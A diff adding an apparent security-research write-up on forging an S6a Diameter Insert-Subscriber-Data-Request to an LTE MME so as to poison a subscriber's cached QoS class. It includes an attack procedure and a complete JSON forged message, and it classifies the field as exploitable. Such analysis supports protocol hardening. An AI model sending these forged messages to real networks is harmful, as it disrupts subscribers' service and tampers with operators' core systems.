@@ -1,0 +1,99 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - The victim is an **MME** exposing its **S6a Diameter** service. An Internet attacker impersonates the **HSS** and sends a forged **Insert-Subscriber-Data-Request (IDR)** to the MME. The MME accepts the request as authoritative HSS-originated subscriber provisioning data for a known UE.
+
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the MME, send crafted **IDR Requests**, and receive the corresponding answers. The attacker knows the target subscriber identity and can populate the required grouped `Subscription-Data` / `APN-Configuration-Profile` structure, but has no additional radio, NAS, GTP, or visibility into legitimate Diameter sessions.
+
+### **Exploitability Analysis:**
+`Subscription-Data.APN-Configuration-Profile.APN-Configuration.EPS-Subscribed-QoS-Profile.QoS-Class-Identifier` is **field-specifically exploitable** under this threat model.
+
+This AVP is not descriptive peer metadata; it is an **authoritative subscriber provisioning parameter** inside HSS->MME IDR. Within a selected `APN-Configuration`, it defines the subscribed **default EPS bearer QCI** for that APN. The MME is expected to parse and store it as part of the UE's cached subscription profile, keyed by the surrounding APN context (`Context-Identifier`, `Service-Selection`, typically `PDN-Type`).
+
+The causal chain is concrete:
+
+1. The attacker forges an **IDR** for a real subscriber and includes a coherent `Subscription-Data` with one `APN-Configuration`.
+2. Inside that APN configuration, the attacker sets `EPS-Subscribed-QoS-Profile/QoS-Class-Identifier` to a different but valid QCI value.
+3. The MME accepts and **overwrites cached APN-specific subscribed QoS state** for that UE.
+4. On later PDN connectivity/default bearer establishment or related bearer handling, the MME reuses that stored APN profile and propagates the subscribed QoS assumptions into downstream bearer/session control.
+5. The result can be **wrong bearer treatment, QoS downgrade/upgrade, policy mismatch, or bearer establishment anomalies** for that APN.
+
+The target field itself is the key control point because changing this one leaf changes the subscribed QoS class attached to the APN configuration, while leaving the rest of the forged IDR structurally valid. This is a classic subscriber-state poisoning case: the MME stores the value and later uses it in real control-plane behavior without requiring any extra attacker capability beyond the forged Diameter request.
+
+The impact is not merely "forged IDR is bad." A forged IDR could update many kinds of subscription data, but this field specifically controls **APN-specific bearer QoS semantics**. Using a valid but semantically different QCI such as changing an internet APN from `9` to `5`, or an IMS-related APN away from its expected value, can create concrete service-impacting misprovisioning.
+
+The effect may be delayed until the next bearer/session event rather than instantaneous, and later legitimate HSS updates can overwrite it. But temporary persistence in the MME is sufficient for field-specific exploitability because the poisoned value is cached and consumed by subsequent normal procedures.
+
+### **Attack Procedure:**
+Craft a forged **S6a Insert-Subscriber-Data-Request** from the spoofed HSS to the target MME, including the required Diameter routing/session AVPs and a `Subscription-Data` grouped AVP containing:
+
+- `APN-Configuration-Profile`
+  - `All-APN-Configurations-Included-Indicator`
+  - one `APN-Configuration`
+    - `Context-Identifier`
+    - `PDN-Type`
+    - `Service-Selection`
+    - `EPS-Subscribed-QoS-Profile`
+      - `QoS-Class-Identifier` set to the attacker-chosen valid but harmful QCI
+      - `Allocation-Retention-Priority`
+
+A practical malicious choice is to target a known APN and replace its expected default bearer QCI with a different standardized QCI that is still syntactically valid. Success is observable if the MME returns a successful IDA and later bearer establishment for that APN shows changed QoS behavior or fails due to profile inconsistency.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": "319",
+    "application_id": "16777251",
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    { "name": "Session-Id", "value": "fakehss.example.net;172839405;1" },
+    {
+      "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    { "name": "Auth-Session-State", "value": 1 },
+    { "name": "Origin-Host", "value": "hss01.example.net" },
+    { "name": "Origin-Realm", "value": "example.net" },
+    { "name": "Destination-Host", "value": "mme01.example.net" },
+    { "name": "Destination-Realm", "value": "example.net" },
+    { "name": "User-Name", "value": "001010123456789" },
+    { "name": "IDR-Flags", "value": 0 },
+    {
+      "name": "Subscription-Data",
+      "value": {
+        "APN-Configuration-Profile": {
+          "All-APN-Configurations-Included-Indicator": 1,
+          "APN-Configuration": [
+            {
+              "Context-Identifier": 1,
+              "PDN-Type": 0,
+              "Service-Selection": "internet",
+              "AMBR": {
+                "Max-Requested-Bandwidth-UL": 1000000,
+                "Max-Requested-Bandwidth-DL": 1000000
+              },
+              "EPS-Subscribed-QoS-Profile": {
+                "QoS-Class-Identifier": 5,
+                "Allocation-Retention-Priority": {
+                  "Priority-Level": 8,
+                  "Pre-emption-Capability": 1,
+                  "Pre-emption-Vulnerability": 0
+                }
+              }
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
